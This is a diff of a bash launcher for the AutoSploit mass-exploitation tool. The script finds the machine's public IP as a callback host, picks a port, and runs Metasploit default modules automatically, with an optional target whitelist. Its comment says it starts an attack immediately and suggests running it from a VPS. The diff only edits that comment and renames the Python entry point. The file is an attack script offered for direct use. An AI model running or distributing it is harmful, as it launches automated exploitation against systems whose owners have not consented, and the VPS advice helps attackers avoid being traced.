@@ -1,10 +1,6 @@
 #!/bin/bash
 
-#
-# this script runs autosploit with default configs and default modules
-# protip be on a VPS when you run this because it's gonna start an attack
-# right away
-#
+# This will start an attack immediately upon startup. Run this on a VPS
 
 
 if [[ $# -lt 1 ]]; then
@@ -23,7 +19,7 @@ LHOST=`dig +short @resolver1.opendns.com myip.opendns.com`
 TIMESTAMP=`date +%s`
 
 if [[ ! $WHITELIST ]]; then
-  python autosploit.py -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT -f etc/json/default_modules.json
+  python sploit.py -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT -f etc/json/default_modules.json
 else
-  python autosploit.py --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT -f etc/json/default_modules.json
+  python sploit.py --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT -f etc/json/default_modules.json
 fi;
